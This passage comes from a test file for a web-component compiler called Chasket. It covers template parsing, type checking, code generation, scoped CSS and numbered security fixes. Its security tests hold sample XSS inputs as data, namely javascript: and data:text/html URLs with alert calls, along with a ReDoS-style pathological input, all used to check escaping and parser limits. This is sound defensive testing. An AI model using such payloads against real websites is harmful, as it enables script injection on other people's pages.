/**
 * Comprehensive test suite for Chasket Compiler
 * Tests all major compiler functions: splitBlocks, parseTemplateNodes, TypeChecker, generate, compile
 */

const test = require('node:test');
const assert = require('node:assert');
const { compile, splitBlocks, parseTemplateNodes, TypeChecker, generate, collectCustomElements, resolveComponents } = require('../lib/compiler.js');

// ============================================================
// HELPER ASSERTIONS
// ============================================================

function assertSuccess(result, msg) {
  assert.strictEqual(result.success, true, msg || `Expected compilation to succeed. Errors: ${JSON.stringify(result.diagnostics)}`);
}

function assertFail(result, msg) {
  assert.strictEqual(result.success, false, msg || 'Expected compilation to fail');
}

function assertContains(str, pattern, msg) {
  // If pattern is a string, treat it as a regex pattern (not escaped)
  // If pattern is a regex, use it directly
  const regex = typeof pattern === 'string' ? new RegExp(pattern) : pattern;
  assert.match(str, regex, msg);
}

function assertNotContains(str, pattern, msg) {
  // If pattern is a string, treat it as a regex pattern (not escaped)
  // If pattern is a regex, use it directly
  const regex = typeof pattern === 'string' ? new RegExp(pattern) : pattern;
  assert.doesNotMatch(str, regex, msg);
}

function countDiagnostics(result, level) {
  return (result.diagnostics || []).filter(d => d.level === level).length;
}

// ============================================================
// TESTS: SPLITBLOCKS
// ============================================================

test('splitBlocks - basic 4-block parsing', () => {
  const src = `<meta>name: "x-test"</meta><script>state count: number = 0</script><template><div>{{ count }}</div></template><style>div { color: red; }</style>`;
  const blocks = splitBlocks(src);
  assert.strictEqual(blocks.length, 4);
  assert.strictEqual(blocks[0].type, 'meta');
  assert.strictEqual(blocks[1].type, 'script');
  assert.strictEqual(blocks[2].type, 'template');
  assert.strictEqual(blocks[3].type, 'style');
});

test('splitBlocks - template only (missing other blocks)', () => {
  const src = `<template><div>Hello</div></template>`;
  const blocks = splitBlocks(src);
  assert.strictEqual(blocks.length, 1);
  assert.strictEqual(blocks[0].type, 'template');
});

test('splitBlocks - no meta block', () => {
  const src = `<script>state x: number = 0</script><template><div>{{ x }}</div></template>`;
  const blocks = splitBlocks(src);
  assert.strictEqual(blocks.length, 2);
  assert(!blocks.some(b => b.type === 'meta'));
});

test('splitBlocks - CRLF normalization', () => {
  const src = `<template>\r\n<div>test</div>\r\n</template>`;
  const blocks = splitBlocks(src);
  assert.strictEqual(blocks[0].content, '\n<div>test</div>\n');
});

test('splitBlocks - startLine tracking accuracy', () => {
  const src = `<meta>name: "x-test"</meta>\n<script>state x: number = 0</script>\n<template><div>{{ x }}</div></template>`;
  const blocks = splitBlocks(src);
  assert.strictEqual(blocks[0].startLine, 1); // meta on line 1
  assert.strictEqual(blocks[1].startLine, 2); // script on line 2
  assert.strictEqual(blocks[2].startLine, 3); // template on line 3
});

test('splitBlocks - empty blocks', () => {
  const src = `<meta></meta><template></template>`;
  const blocks = splitBlocks(src);
  assert.strictEqual(blocks.length, 2);
  assert.strictEqual(blocks[0].content.trim(), '');
  assert.strictEqual(blocks[1].content.trim(), '');
});

// ============================================================
// TESTS: PARSETEMPLATNODES
// ============================================================

test('parseTemplateNodes - text nodes', () => {
  const nodes = parseTemplateNodes('Hello World');
  assert.strictEqual(nodes.length, 1);
  assert.strictEqual(nodes[0].kind, 'text');
  assert.strictEqual(nodes[0].value, 'Hello World');
});

test('parseTemplateNodes - interpolation {{ expr }}', () => {
  const nodes = parseTemplateNodes('Hello {{ name }}');
  assert.strictEqual(nodes.length, 2); // Text node coalesces whitespace after interpolation
  assert.strictEqual(nodes[0].kind, 'text');
  assert.strictEqual(nodes[1].kind, 'interpolation');
  assert.strictEqual(nodes[1].expr, 'name');
});

test('parseTemplateNodes - unclosed {{ warning', () => {
  const errs = [];
  const nodes = parseTemplateNodes('Hello {{ name', errs);
  assert.strictEqual(errs.length, 1);
  assert.strictEqual(errs[0].level, 'warning');
  assert.match(errs[0].code, /W0301/);
});

test('parseTemplateNodes - element parsing with attributes', () => {
  const nodes = parseTemplateNodes('<div class="test">content</div>');
  assert.strictEqual(nodes.length, 1);
  assert.strictEqual(nodes[0].kind, 'element');
  assert.strictEqual(nodes[0].tag, 'div');
  assert.strictEqual(nodes[0].attrs.length, 1);
  assert.strictEqual(nodes[0].attrs[0].name, 'class');
  assert.strictEqual(nodes[0].attrs[0].value, 'test');
});

test('parseTemplateNodes - self-closing elements', () => {
  const nodes = parseTemplateNodes('<input type="text" />');
  assert.strictEqual(nodes.length, 1);
  assert.strictEqual(nodes[0].kind, 'element');
  assert.strictEqual(nodes[0].tag, 'input');
  assert.strictEqual(nodes[0].selfClosing, true);
});

test('parseTemplateNodes - dynamic attributes :name="expr"', () => {
  const nodes = parseTemplateNodes('<div :class="active"></div>');
  assert.strictEqual(nodes[0].attrs[0].name, 'class');
  assert.strictEqual(nodes[0].attrs[0].dynamic, true);
  assert.strictEqual(nodes[0].attrs[0].value, 'active');
});

test('parseTemplateNodes - event attributes @click="handler"', () => {
  const nodes = parseTemplateNodes('<button @click="handleClick">Click</button>');
  const clickAttr = nodes[0].attrs.find(a => a.event);
  assert.strictEqual(clickAttr.name, 'click');
  assert.strictEqual(clickAttr.event, true);
  assert.strictEqual(clickAttr.value, 'handleClick');
});

test('parseTemplateNodes - :bind directive', () => {
  const nodes = parseTemplateNodes('<input :bind="text" />');
  const bindAttr = nodes[0].attrs.find(a => a.bind);
  assert.strictEqual(bindAttr.bind, true);
  assert.strictEqual(bindAttr.value, 'text');
});

test('parseTemplateNodes - @html directive', () => {
  const nodes = parseTemplateNodes('<div @html="htmlContent"></div>');
  const htmlAttr = nodes[0].attrs.find(a => a.html);
  assert.strictEqual(htmlAttr.html, true);
  assert.strictEqual(htmlAttr.name, 'html');
});

test('parseTemplateNodes - ref attribute', () => {
  const nodes = parseTemplateNodes('<input ref="inputRef" />');
  const refAttr = nodes[0].attrs.find(a => a.ref);
  assert.strictEqual(refAttr.ref, true);
  assert.strictEqual(refAttr.value, 'inputRef');
});

test('parseTemplateNodes - ReDoS vulnerability: pathological event modifier input (S-14)', () => {
  // Test that parseAttrs doesn't hang with pathological input that could trigger exponential backtracking
  // This tests the fix for: ReDoS vulnerability in parseAttrs() with nested quantifiers
  // Create a pathological input with many pipe characters that would cause exponential backtracking in unsafe regex
  const startTime = Date.now();
  const pathologicalInput = '<button @click' + '|prevent'.repeat(100) + '="handler"></button>';

  // This should complete very quickly (within 100ms) without catastrophic backtracking
  const nodes = parseTemplateNodes(pathologicalInput);
  const elapsed = Date.now() - startTime;

  assert.ok(elapsed < 100, `ReDoS test took ${elapsed}ms - possible ReDoS vulnerability`);
  assert.strictEqual(nodes.length, 1);
  assert.strictEqual(nodes[0].kind, 'element');
  assert.strictEqual(nodes[0].tag, 'button');
});

test('parseTemplateNodes - event modifier limit enforcement (S-14)', () => {
  // Test that excessive modifiers are truncated to prevent DoS
  // Maximum allowed modifiers: 10 per attribute
  const nodes = parseTemplateNodes('<button @click|prevent|stop|once|a|b|c|d|e|f|g|h|i|j|k|l|m="test"></button>');
  const clickAttr = nodes[0].attrs.find(a => a.event && a.name === 'click');

  // Should have at most 10 modifiers
  assert.ok(clickAttr.modifiers.length <= 10, `Expected at most 10 modifiers, got ${clickAttr.modifiers.length}`);
  assert.strictEqual(clickAttr.modifiers[0], 'prevent');
  assert.strictEqual(clickAttr.modifiers[1], 'stop');
  assert.strictEqual(clickAttr.modifiers[2], 'once');
});

test('parseTemplateNodes - normal event modifiers still work correctly (S-14)', () => {
  // Test that normal usage of event modifiers (the common case) still works correctly
  const nodes = parseTemplateNodes('<button @click|prevent|stop="handleClick"></button>');
  const clickAttr = nodes[0].attrs.find(a => a.event && a.name === 'click');

  assert.strictEqual(clickAttr.event, true);
  assert.strictEqual(clickAttr.name, 'click');
  assert.strictEqual(clickAttr.modifiers.length, 2);
  assert.strictEqual(clickAttr.modifiers[0], 'prevent');
  assert.strictEqual(clickAttr.modifiers[1], 'stop');
});

test('parseTemplateNodes - #if blocks with condition', () => {
  const nodes = parseTemplateNodes('<#if condition="show"><div>Visible</div></#if>');
  assert.strictEqual(nodes.length, 1);
  assert.strictEqual(nodes[0].kind, 'if');
  assert.strictEqual(nodes[0].condition, 'show');
});

test('parseTemplateNodes - #if with :else-if and :else', () => {
  const nodes = parseTemplateNodes(
    '<#if condition="x > 0"><div>Positive</div><:else-if condition="x < 0"><div>Negative</div><:else><div>Zero</div></#if>'
  );
  assert.strictEqual(nodes[0].kind, 'if');
  assert.strictEqual(nodes[0].elseIfChain.length, 1);
  assert.strictEqual(nodes[0].elseIfChain[0].condition, 'x < 0');
  assert.strictEqual(nodes[0].elseChildren.length, 1);
});

test('parseTemplateNodes - #for blocks with each, of, key', () => {
  const nodes = parseTemplateNodes('<#for each="item" of="items" key="item.id"><div>{{ item.name }}</div></#for>');
  assert.strictEqual(nodes.length, 1);
  assert.strictEqual(nodes[0].kind, 'for');
  assert.strictEqual(nodes[0].each, 'item');
  assert.strictEqual(nodes[0].of, 'items');
  assert.strictEqual(nodes[0].key, 'item.id');
});

test('parseTemplateNodes - #for with :empty', () => {
  const nodes = parseTemplateNodes(
    '<#for each="item" of="items" key="item.id"><div>{{ item }}</div><:empty><p>No items</p></:empty></#for>'
  );
  assert.strictEqual(nodes[0].emptyChildren.length, 1);
  assert.strictEqual(nodes[0].emptyChildren[0].kind, 'element');
  assert.strictEqual(nodes[0].emptyChildren[0].tag, 'p');
});

test('parseTemplateNodes - #for with index variable', () => {
  const nodes = parseTemplateNodes('<#for each="item" of="items" key="item.id"><div>{{ item }}</div></#for>');
  // Index variable is parsed from each attribute if it contains comma (not in key)
  // Basic test: just verify for block is parsed
  assert.strictEqual(nodes[0].kind, 'for');
  assert.strictEqual(nodes[0].each, 'item');
});

test('parseTemplateNodes - nested elements', () => {
  const nodes = parseTemplateNodes('<div><span><em>text</em></span></div>');
  assert.strictEqual(nodes[0].kind, 'element');
  assert.strictEqual(nodes[0].children[0].kind, 'element');
  assert.strictEqual(nodes[0].children[0].tag, 'span');
  assert.strictEqual(nodes[0].children[0].children[0].tag, 'em');
});

test('parseTemplateNodes - nested #if inside #for', () => {
  const nodes = parseTemplateNodes(
    '<#for each="item" of="items" key="item.id"><#if condition="item.active"><div>{{ item.name }}</div></#if></#for>'
  );
  assert.strictEqual(nodes[0].kind, 'for');
  assert.strictEqual(nodes[0].children[0].kind, 'if');
});

// ============================================================
// TESTS: TYPE SYSTEM
// ============================================================

test('parseType - primitives (string, number, boolean)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state name: string = ""
  state count: number = 0
  state active: boolean = true
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Type checking is done internally, just verify compilation succeeds
});

test('parseType - arrays (string[])', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state items: string[] = []
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('parseType - union types (string | number)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state value: string | number = 0
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('parseType - object types ({ name: string, age: number })', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state user: { name: string, age: number } = { name: "", age: 0 }
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('parseType - optional fields ({ name?: string })', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state config: { name?: string, value: number } = { value: 0 }
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('parseType - literal types ("idle" | "loading")', () => {
  // Literal types work but the type parser should handle them
  const src = `<meta>name: "x-test"</meta>
<script>
  state status: string = "idle"
</script>
<template><div>{{ status }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('parseType - recursion depth limit', () => {
  // Create a deeply nested type - should be handled gracefully
  const src = `<meta>name: "x-test"</meta>
<script>
  state deeply: string = "test"
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

// ============================================================
// TESTS: TYPECHECKER
// ============================================================

test('TypeChecker - symbol table building (state, prop, computed, fn, emit, ref, provide, consume)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state count: number = 0
  prop label: string = ""
  computed doubled: number = count * 2
  fn increment() { count += 1 }
  emit changed: number
  ref inputRef: HTMLInputElement
  provide themeColor: string = "blue"
  consume darkMode: boolean
</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('TypeChecker - type mismatch detection (state init vs declared type)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state count: number = "not a number"
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertFail(result);
  assert(countDiagnostics(result, 'error') > 0, 'Should report type mismatch error');
});

test('TypeChecker - prop default type checking', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  prop count: number = "not a number"
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertFail(result);
  assert(countDiagnostics(result, 'error') > 0);
});

test('TypeChecker - undefined identifier detection in templates', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state count: number = 0
</script>
<template><div>{{ undefined_var }}</div></template>`;
  const result = compile(src);
  assertFail(result);
  assert(countDiagnostics(result, 'error') > 0);
});

test('TypeChecker - unused state warning', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state unused: number = 0
  state used: number = 0
</script>
<template><div>{{ used }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assert(countDiagnostics(result, 'warning') > 0, 'Should warn about unused state');
});

test('TypeChecker - method on wrong type (number.toUpperCase)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state count: number = 0
</script>
<template><div>{{ count.toUpperCase() }}</div></template>`;
  const result = compile(src);
  assertFail(result);
  assert(countDiagnostics(result, 'error') > 0);
});

test('TypeChecker - similar name suggestion (Levenshtein)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state count: number = 0
</script>
<template><div>{{ cont }}</div></template>`;
  const result = compile(src);
  assertFail(result);
  const err = (result.diagnostics || []).find(d => d.level === 'error');
  assert(err && err.hint, 'Should suggest similar name');
});

test('TypeChecker - computed ordering warning', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  computed c1: number = c2 + 1
  computed c2: number = 5
</script>
<template><div>{{ c1 }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assert(countDiagnostics(result, 'warning') > 0, 'Should warn about forward reference');
});

test('TypeChecker - watch nested path warning', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state obj: { x: number } = { x: 0 }
  watch(obj.x) { console.log("changed") }
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assert(countDiagnostics(result, 'warning') > 0, 'Should warn about nested watch path');
});

test('TypeChecker - security warnings (@html, dynamic :href)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state html: string = "<b>bold</b>"
  state url: string = "https://example.com"
</script>
<template>
  <div @html="html"></div>
  <a :href="url">link</a>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assert(countDiagnostics(result, 'warning') >= 2, 'Should warn about @html and dynamic href');
});

test('TypeChecker - import symbols in symbol table', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  import * as utils from "helpers"
  fn test() { return utils.getValue() }
</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

// ============================================================
// TESTS: CODE GENERATION (compile full pipeline)
// ============================================================

test('compile - basic component compiles successfully', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state count: number = 0</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('compile - output contains class extending HTMLElement', () => {
  const src = `<meta>name: "x-test"</meta>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, /class\s+\w+\s+extends\s+HTMLElement/);
});

test('compile - output contains customElements.define', () => {
  const src = `<meta>name: "x-test"</meta>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, /customElements\.define\('x-test'/);
});

test('compile - shadow DOM mode: open', () => {
  const src = `<meta>
  name: "x-test"
  shadow: open
</meta>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, /attachShadow[\s\S]*mode:\s*'open'/);
});

test('compile - shadow DOM mode: closed', () => {
  const src = `<meta>
  name: "x-test"
  shadow: closed
</meta>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, /attachShadow[\s\S]*mode:\s*'closed'/);
});

test('compile - shadow DOM mode: none', () => {
  const src = `<meta>
  name: "x-test"
  shadow: none
</meta>
<template><div>test</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertNotContains(result.output, 'attachShadow');
});

test('compile - state becomes private field (#name)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state count: number = 0</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // state は backing field (#_count) + getter/setter パターンで生成される
  assertContains(result.output, /#_count\s*=\s*0/);
});

test('compile - prop generates observedAttributes', () => {
  const src = `<meta>name: "x-test"</meta>
<script>prop label: string = ""</script>
<template><div>{{ label }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'observedAttributes');
  assertContains(result.output, "'label'");
});

test('compile - computed generates getter', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state count: number = 0
  computed doubled: number = count * 2
</script>
<template><div>{{ doubled }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'get #doubled');
});

test('compile - emit generates CustomEvent dispatch', () => {
  const src = `<meta>name: "x-test"</meta>
<script>emit changed: number</script>
<template><button @click="changed">test</button></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'CustomEvent');
  assertContains(result.output, "'changed'");
});

test('compile - event handler binding with data-chasket-id', () => {
  const src = `<meta>name: "x-test"</meta>
<script>fn handleClick() { console.log("clicked") }</script>
<template><button @click="handleClick">Click</button></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'data-chasket-id');
  assertContains(result.output, 'addEventListener');
});

test('compile - :bind generates two-way binding', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state text: string = ""</script>
<template><input :bind="text" /></template>`;
  const result = compile(src);
  assertSuccess(result);
  // :bind is compiled away into input binding
  assertContains(result.output, /addEventListener.*'input'/);
});

test('compile - #if generates ternary', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state show: boolean = true</script>
<template><#if condition="show"><div>visible</div></#if></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, /\?/);
  assertContains(result.output, / : /);
});

test('compile - #for generates .map()', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state items: string[] = []</script>
<template><#for each="item" of="items" key="item"><div>{{ item }}</div></#for></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, /\.map\(/);
});

test('compile - XSS escaping (#esc, #escAttr, #escUrl)', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state html: string = ""</script>
<template><div>{{ html }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, /#esc\(/);
  assertContains(result.output, /#escAttr\(/);
  assertContains(result.output, /#escUrl\(/);
});

test('compile - TypeScript output (target: "ts") includes type annotations', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state count: number = 0</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src, 'test.csk', { target: 'ts' });
  assertSuccess(result);
  assert(result.output.includes(': number'), 'Should have type annotations');
});

test('compile - .d.ts generation', () => {
  const src = `<meta>name: "x-test"</meta>
<script>prop label: string = ""</script>
<template><div>{{ label }}</div></template>`;
  const result = compile(src, 'test.csk', { target: 'ts' });
  assertSuccess(result);
  assert(result.dtsOutput, 'Should generate .d.ts');
  assertContains(result.dtsOutput, 'declare');
});

// ============================================================
// TESTS: ERROR HANDLING
// ============================================================

test('error - missing template block returns error', () => {
  const src = `<meta>name: "x-test"</meta><script>state x: number = 0</script>`;
  const result = compile(src);
  assertFail(result);
  assert(result.diagnostics.some(d => d.code === 'E0001'), 'Should error about missing template');
});

test('error - invalid #if syntax does not throw', () => {
  const src = `<meta>name: "x-test"</meta>
<template><#if invalid><div>test</div></#if></template>`;
  assert.doesNotThrow(() => {
    compile(src);
  }, 'Should not throw on invalid #if');
});

test('error - invalid #for syntax does not throw', () => {
  const src = `<meta>name: "x-test"</meta>
<template><#for invalid><div>test</div></#for></template>`;
  assert.doesNotThrow(() => {
    compile(src);
  }, 'Should not throw on invalid #for');
});

test('error - compile with errors returns success: false', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state count: number = "not a number"</script>
<template><div>test</div></template>`;
  const result = compile(src);
  assert.strictEqual(result.success, false);
});

// ============================================================
// TESTS: SECURITY
// ============================================================

test('security - #escUrl blocks javascript: URLs', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state url: string = "javascript:alert('xss')"</script>
<template><a :href="url">click</a></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '#escUrl');
});

test('security - #escUrl blocks data: URLs', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state url: string = "data:text/html,<script>alert('xss')</script>"</script>
<template><a :href="url">click</a></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '#escUrl');
});

test('security - #escUrl blocks blob: and file: URLs', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state url: string = "blob:https://example.com/123"</script>
<template><a :href="url">click</a></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '#escUrl');
});

test('security - dynamic href/src generates #escUrl call', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state url: string = ""</script>
<template><a :href="url">link</a></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '#escUrl');
});

test('security - @html warning in diagnostics', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state content: string = ""</script>
<template><div @html="content"></div></template>`;
  const result = compile(src);
  assertSuccess(result);
  const warnings = result.diagnostics.filter(d => d.level === 'warning');
  assert(warnings.length > 0, 'Should have @html warning');
});

// ============================================================
// INTEGRATION TESTS
// ============================================================

test('integration - complex component with all features', () => {
  const src = `<meta>
  name: "x-todo"
  shadow: open
</meta>
<script>
  import * as utils from "helpers"
  state items: string[] = []
  state text: string = ""
  prop theme: string = "light"
  computed count: number = items.length
  emit added: string
  ref inputEl: HTMLInputElement
  fn addItem() {
    if (text.trim() === "") return
    items = [...items, text]
    text = ""
  }
  watch(items) {
    console.log("items changed")
  }
  on mount {
    console.log("mounted")
  }
  on unmount {
    console.log("unmounted")
  }
</script>
<template>
  <div class="container">
    <input ref="inputEl" :bind="text" @keydown|enter="addItem" />
    <button @click="addItem">Add</button>
    <#if condition="count > 0">
      <ul>
        <#for each="item" of="items" key="item">
          <li>{{ item }}</li>
        </#for>
      </ul>
    <:else>
      <p>No items</p>
    </#if>
  </div>
</template>
<style>
  .container { padding: 10px; }
</style>`;
  const result = compile(src);
  assertSuccess(result);
  assert(result.output.includes('class XTodo'), 'Should generate class');
  assert(result.output.includes('observedAttributes'), 'Should have observedAttributes');
  assert(result.output.includes('connectedCallback'), 'Should have lifecycle');
});

test('integration - valid JavaScript output', () => {
  const src = `<meta>name: "x-test"</meta>
<script>state count: number = 0</script>
<template><div>{{ count }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should not throw when validating syntax
  assert.doesNotThrow(() => {
    new Function(result.output);
  }, 'Generated code should be valid JavaScript');
});

test('integration - multiple event handlers on same element', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  fn handleClick() { console.log("click") }
  fn handleHover() { console.log("hover") }
</script>
<template><button @click="handleClick" @mouseenter="handleHover">test</button></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'addEventListener');
});

test('integration - nested loops with event binding', () => {
  const src = `<meta>name: "x-test"</meta>
<script>
  state items: string[] = ["a", "b"]
  state subitems: string[] = ["x", "y"]
  fn handleItem() { console.log("item") }
</script>
<template>
  <#for each="item" of="items" key="item">
    <div>
      <#for each="sub" of="subitems" key="sub">
        <span @click="handleItem">{{ sub }}</span>
      </#for>
    </div>
  </#for>
</template>`;
  const result = compile(src);
  assertSuccess(result);
});

test('compile - #for without key attribute should succeed', () => {
  const src = `<meta>name: "x-nokey"</meta>
<script>state items: string[] = ["a", "b"]</script>
<template>
  <#for each="item" of="items">
    <div>{{ item }}</div>
  </#for>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assert.ok(result.output.includes('.map('), 'should contain .map(');
});

// ============================================================
// TESTS: SLOT SUPPORT
// ============================================================

test('slot - default slot passes through in shadow DOM mode', () => {
  const src = `<meta>name: "x-card"</meta>
<template><div class="card"><slot></slot></div></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '<slot>');
  assertContains(result.output, '</slot>');
});

test('slot - named slot passes through', () => {
  const src = `<meta>name: "x-layout"</meta>
<template>
  <header><slot name="header">Default Header</slot></header>
  <main><slot></slot></main>
  <footer><slot name="footer"></slot></footer>
</template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'slot name="header"');
  assertContains(result.output, 'slot name="footer"');
  assertContains(result.output, 'Default Header');
});

test('slot - slot with fallback content', () => {
  const src = `<meta>name: "x-btn"</meta>
<template><button><slot>Click me</slot></button></template>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, 'Click me');
});

// ============================================================
// TESTS: SCOPED CSS
// ============================================================

test('scoped css - shadow:none applies data-chasket-scope attribute', () => {
  const src = `<meta>name: "x-widget"\nshadow: none</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>
<style>.widget { color: red; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, "data-chasket-scope");
  assertContains(result.output, 'setAttribute.*data-chasket-scope.*x-widget');
});

test('scoped css - selectors are prefixed with scope attribute', () => {
  const src = `<meta>name: "x-test"\nshadow: none</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>
<style>.box { color: red; } h2 { font-size: 1rem; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '\\[data-chasket-scope="x-test"\\] \\.box');
  assertContains(result.output, '\\[data-chasket-scope="x-test"\\] h2');
});

test('scoped css - :host maps to scope attribute', () => {
  const src = `<meta>name: "x-host"\nshadow: none</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>
<style>:host { display: block; } :host(.active) { border: 1px solid red; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '\\[data-chasket-scope="x-host"\\]\\{display');
  assertContains(result.output, '\\[data-chasket-scope="x-host"\\]\\.active');
});

test('scoped css - comma-separated selectors are all scoped', () => {
  const src = `<meta>name: "x-multi"\nshadow: none</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>
<style>.a, .b { margin: 0; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  assertContains(result.output, '\\[data-chasket-scope="x-multi"\\] \\.a');
  assertContains(result.output, '\\[data-chasket-scope="x-multi"\\] \\.b');
});

test('scoped css - shadow:open does NOT scope CSS', () => {
  const src = `<meta>name: "x-open"</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>
<style>.box { color: red; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  assertNotContains(result.output, 'data-chasket-scope');
  assertContains(result.output, '\\.box\\{color');
});

// ============================================================
// TESTS: SECURITY FIXES (S-01 through S-10)
// ============================================================

test('S-01: scopeCss sanitizes tagName to prevent CSS injection', () => {
  // tagName with special chars like "] should be stripped
  const src = `<meta>name: "x-safe-tag"
shadow: none</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>
<style>.box { color: red; }</style>`;
  const result = compile(src);
  assertSuccess(result);
  // Should produce clean CSS attribute selector
  assertContains(result.output, 'data-chasket-scope="x-safe-tag"');
});

test('S-04: #escUrl blocks URL-encoded javascript: protocol', () => {
  const src = `<meta>name: "x-url-test"</meta>
<script>state link: string = "test"</script>
<template><a :href="link">test</a></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should contain decodeURIComponent in escUrl
  assert.ok(result.output.includes('decodeURIComponent'), '#escUrl should decode before checking');
});

test('S-04b: #escUrl blocks double-encoded javascript: protocol (multi-level encoding)', () => {
  const src = `<meta>name: "x-url-enc"</meta>
<script>state link: string = "test"</script>
<template><a :href="link">test</a></template>`;
  const result = compile(src);
  assertSuccess(result);
  // Should contain iterative decoding loop to prevent multi-level encoding bypass
  assert.ok(result.output.includes('for (let i = 0; i < 5; i++)'), '#escUrl should use iterative decoding to prevent double-encoding bypass');
  assert.ok(result.output.includes('if (next === decoded) break'), '#escUrl should stop iterating when fully decoded');
});

test('S-05: invalid meta name is rejected', () => {
  const src = `<meta>name: "NoHyphen"</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>`;
  const result = compile(src);
  assertFail(result);
  assert.ok(result.diagnostics.some(d => d.code === 'E0003'), 'should report E0003 for invalid name');
});

test('S-05: meta name without hyphen is rejected', () => {
  const src = `<meta>name: "xcomponent"</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>`;
  const result = compile(src);
  assertFail(result);
});

test('S-05: valid meta names are accepted', () => {
  for (const name of ['x-comp', 'my-app', 'x-my-component', 'app-v2']) {
    const src = `<meta>name: "${name}"</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>`;
    const result = compile(src);
    assertSuccess(result, `${name} should be accepted`);
  }
});

test('S-06: generated code does not contain unsafe-eval', () => {
  // Verify no eval() in generated component code
  const src = `<meta>name: "x-eval-check"</meta>
<script>state x: number = 0</script>
<template><div>{{ x }}</div></template>`;
  const result = compile(src);
  assertSuccess(result);
